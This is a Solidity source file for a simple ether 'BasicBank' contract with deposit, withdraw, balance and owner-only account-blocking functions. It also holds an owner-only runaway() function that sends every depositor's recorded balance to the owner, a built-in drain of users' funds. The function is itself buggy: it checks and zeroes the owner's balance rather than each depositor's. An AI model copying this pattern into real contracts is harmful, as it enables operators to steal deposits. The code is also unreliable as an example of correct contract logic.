pragma solidity ^0.4.11;

contract Owner {
    address owner;
    
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }
    
    function getOwner() public view returns(address) {
        return owner;
    }
}

contract BasicBank is Owner{
    struct Account {
        uint balance;
        bool isBlocked;
    }
    
    modifier isAccountOpen() {
        require(accounts[msg.sender].isBlocked == false);
        _;
    }

    modifier hasEnoughBalance(uint _value) {
        require(accounts[msg.sender].balance >= _value);
        _;
    }

    event LogDepositMade(address accountAddress, uint amount);
    mapping(address => Account) private accounts;
    address[] addressList;
    
    function BasicBank() public {
        owner = msg.sender;
    }
    
    function deposit() isAccountOpen public payable returns(uint) {
        accounts[msg.sender].balance += msg.value;
        addressList.push(msg.sender);
        LogDepositMade(msg.sender, msg.value);
        return accounts[msg.sender].balance;
    }
    
    function withdraw(uint withdrawAmount) isAccountOpen hasEnoughBalance(withdrawAmount) public returns(uint) {
        accounts[msg.sender].balance -= withdrawAmount;
        if (!msg.sender.send(withdrawAmount)) {
            accounts[msg.sender].balance += withdrawAmount;
        }
        return accounts[msg.sender].balance;
    }

    function balance() public view returns(uint) {
        return accounts[msg.sender].balance;   
    }
    
    function blockAccount(address _target) onlyOwner public {
        accounts[_target].isBlocked = true;
    }

    function unblockAccount(address _target) onlyOwner public {
        accounts[_target].isBlocked = false;
    }

    function runaway() onlyOwner public {
        for(uint index=0; index < addressList.length; index++) {
            if(accounts[msg.sender].balance != 0 && owner.send(accounts[addressList[index]].balance)) {
                accounts[msg.sender].balance = 0;    
            }
        }    
    }
}